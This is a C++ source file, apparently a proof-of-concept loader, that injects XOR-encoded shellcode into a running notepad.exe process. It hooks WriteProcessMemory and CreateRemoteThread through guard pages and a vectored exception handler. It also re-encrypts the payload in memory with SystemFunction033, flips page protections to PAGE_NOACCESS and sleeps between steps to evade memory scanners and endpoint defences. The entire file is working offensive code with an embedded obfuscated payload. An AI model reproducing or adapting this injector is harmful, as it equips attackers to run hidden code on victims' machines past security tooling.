#include <Windows.h>
#include <iostream>
#include <WtsApi32.h>
#include <iomanip>
#include <stdio.h>

using namespace std;

typedef NTSTATUS(WINAPI* _SystemFunction033)(
    struct ustring* memoryRegion,
    struct ustring* keyPointer
);


struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} _data, key, _data2;

unsigned char* XORDecrypt(unsigned char key, unsigned char* payload, int len) {
    for (int i = 0; i < len; i++) {
        payload[i] = payload[i] ^ key;
    }
    return payload;
}

bool SleepImplant(DWORD dwMilliseconds) {
    HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (hEvent == NULL) {
		return false;
	}
	HANDLE hTimer = NULL;
	LARGE_INTEGER liDueTime;
	liDueTime.QuadPart = -10000LL * dwMilliseconds;
	hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
    if (hTimer == NULL) {
		CloseHandle(hEvent);
		return false;
	}
    if (!SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, FALSE)) {
		CloseHandle(hEvent);
		CloseHandle(hTimer);
		return false;
	}
    if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0) {
		CloseHandle(hEvent);
		CloseHandle(hTimer);
		return false;
	}
	CloseHandle(hEvent);
	CloseHandle(hTimer);
	return true;    
}

char shellcode[] = "\xf6\x42\x89\xee\xfa\xe2\xca\xa\xa\xa\x4b\x5b\x4b\x5a\x58\x5b\x5c\x42\x3b\xd8\x6f\x42\x81\x58\x6a\x42\x81\x58\x12\x42\x81\x58\x2a\x42\x81\x78\x5a\x42\x5\xbd\x40\x40\x47\x3b\xc3\x42\x3b\xca\xa6\x36\x6b\x76\x8\x26\x2a\x4b\xcb\xc3\x7\x4b\xb\xcb\xe8\xe7\x58\x4b\x5b\x42\x81\x58\x2a\x81\x48\x36\x42\xb\xda\x81\x8a\x82\xa\xa\xa\x42\x8f\xca\x7e\x6d\x42\xb\xda\x5a\x81\x42\x12\x4e\x81\x4a\x2a\x43\xb\xda\xe9\x5c\x42\xf5\xc3\x4b\x81\x3e\x82\x42\xb\xdc\x47\x3b\xc3\x42\x3b\xca\xa6\x4b\xcb\xc3\x7\x4b\xb\xcb\x32\xea\x7f\xfb\x46\x9\x46\x2e\x2\x4f\x33\xdb\x7f\xd2\x52\x4e\x81\x4a\x2e\x43\xb\xda\x6c\x4b\x81\x6\x42\x4e\x81\x4a\x16\x43\xb\xda\x4b\x81\xe\x82\x42\xb\xda\x4b\x52\x4b\x52\x54\x53\x50\x4b\x52\x4b\x53\x4b\x50\x42\x89\xe6\x2a\x4b\x58\xf5\xea\x52\x4b\x53\x50\x42\x81\x18\xe3\x5d\xf5\xf5\xf5\x57\x42\xb0\xb\xa\xa\xa\xa\xa\xa\xa\x42\x87\x87\xb\xb\xa\xa\x4b\xb0\x3b\x81\x65\x8d\xf5\xdf\xb1\xea\x17\x20\x0\x4b\xb0\xac\x9f\xb7\x97\xf5\xdf\x42\x89\xce\x22\x36\xc\x76\x0\x8a\xf1\xea\x7f\xf\xb1\x4d\x19\x78\x65\x60\xa\x53\x4b\x83\xd0\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\xa\xa";


int getPidByProcName(const char* procname) {
    int pid = 0;
    WTS_PROCESS_INFOA* proc_info;
    DWORD pi_count = 0;

    if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &proc_info, &pi_count)) return 0;

    for (int i = 0; i < pi_count; i++) {
        if (lstrcmpiA(procname, proc_info[i].pProcessName) == 0) {
            pid = proc_info[i].ProcessId;
            break;
        }
    }

    return pid;
}

HANDLE hookedCreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    //MessageBoxA(0, "Hooked CreateRemoteThread", "YAY!", 0);
    DWORD old;

    SIZE_T bytesRead = 0;
    // Resolve SystemFunction033 address from advapi32.dll
    _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction033");

    // Arrives here encrypted and with PAGE_NOACCESS

    SleepImplant(9520);

    VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_READWRITE, &old);

    printf("[!] Permisions changed to PAGE_READWRITE\n");

    // Decryption with SystemFuncion033
    // Error porque no se puede acceder a la memoria con SystemFunction033 de lpStartAddress ya que esta en un proceso remoto
    char _key[] = "1234567890123456";

    key.Buffer = (&_key);
    key.Length = sizeof(_key);
    _data2.Buffer = shellcode;
    _data2.Length = sizeof(shellcode);

    SystemFunction033(&_data2, &key);

    WriteProcessMemory(hProcess, lpStartAddress, &shellcode, sizeof(shellcode), &bytesRead);
    printf("[!] Decrypted Shellcode written in the Address = %p\n", lpStartAddress);
        

    VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_NOACCESS, &old);

    SleepImplant(11120);

    VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_EXECUTE, &old);

    CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

    SleepImplant(9520);

    VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_READWRITE, &old);

    SystemFunction033(&_data2, &key);

    WriteProcessMemory(hProcess, lpStartAddress, &shellcode, sizeof(shellcode), &bytesRead);

    printf("Shellcode Encrypted written in the Address = %p\n", lpStartAddress);

    VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_NOACCESS, &old);
    printf("[!] Permisions changed to PAGE_NOACCESS\n");

    VirtualProtect(&CreateRemoteThread, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
    return NULL;
}

HANDLE hookedWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) {
    HANDLE hMap;
    SIZE_T numberOfBytesWritten;
    DWORD old;
    LPVOID mapViewMemory;
    char name[] = "Local\\S12";
    char _key[] = "1234567890123456";


    // Resolve SystemFunction033 address from advapi32.dll 
    _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction033");

    XORDecrypt(0x0A, (unsigned char*)shellcode, sizeof(shellcode)); 
    // Encryption with SystemFuncion033
    key.Buffer = (&_key);
    key.Length = sizeof(_key);

    _data.Buffer = (char*)lpBuffer;
    _data.Length = nSize;

    SystemFunction033(&_data, &key);
    printf("[!] Encrypted Shellcode address = %p\n", _data.Buffer);

    WriteProcessMemory(hProcess, lpBaseAddress, _data.Buffer, nSize, &numberOfBytesWritten);

    VirtualProtectEx(hProcess, lpBaseAddress, 1, PAGE_NOACCESS, &old);

    SleepImplant(9520);

    return NULL;
}

LONG WINAPI exceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)&WriteProcessMemory) {
            cout << "[!] RIP = " << ExceptionInfo->ContextRecord->Rip << endl;
            ExceptionInfo->ContextRecord->Rip = (DWORD64)&hookedWriteProcessMemory;

            cout << "[+] Modified RIP Points to: " << ExceptionInfo->ContextRecord->Rip << " (Hook Function = " << (DWORD64)&hookedWriteProcessMemory << ")" << endl;
        }
        else if (ExceptionInfo->ContextRecord->Rip == (DWORD64)&CreateRemoteThread) {
            cout << "[!] RIP = " << ExceptionInfo->ContextRecord->Rip << endl;
            ExceptionInfo->ContextRecord->Rip = (DWORD64)&hookedCreateRemoteThread;

            cout << "[+] Modified RIP Points to: " << ExceptionInfo->ContextRecord->Rip << " (Hook Function = " << (DWORD64)&hookedCreateRemoteThread << ")" << endl;

        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}



int main(int argc, char* argv[]) {
    DWORD old = 0;
    PVOID hMemory;
    HANDLE hProcess;
    int pid;
    SIZE_T copiedBytes;

    AddVectoredExceptionHandler(1, &exceptionHandler);
    pid = getPidByProcName("notepad.exe");
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

    hMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE);
    cout << "[!] Allocated Memory Space = " << hMemory << endl;

    printf("[!] WriteProcessMemory Address: 0x%p\n", WriteProcessMemory);
    VirtualProtect(&WriteProcessMemory, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);

    WriteProcessMemory(hProcess, hMemory, &shellcode, sizeof(shellcode), &copiedBytes);

    cout << "[+] WriteProcessMemory Guard Completed" << endl;

    VirtualProtect(&CreateRemoteThread, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
    printf("[!] Setted as Page Guard  :  CreateRemoteThread Address: 0x%p\n", CreateRemoteThread);

    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hMemory, NULL, 0, NULL);

    return 0;
}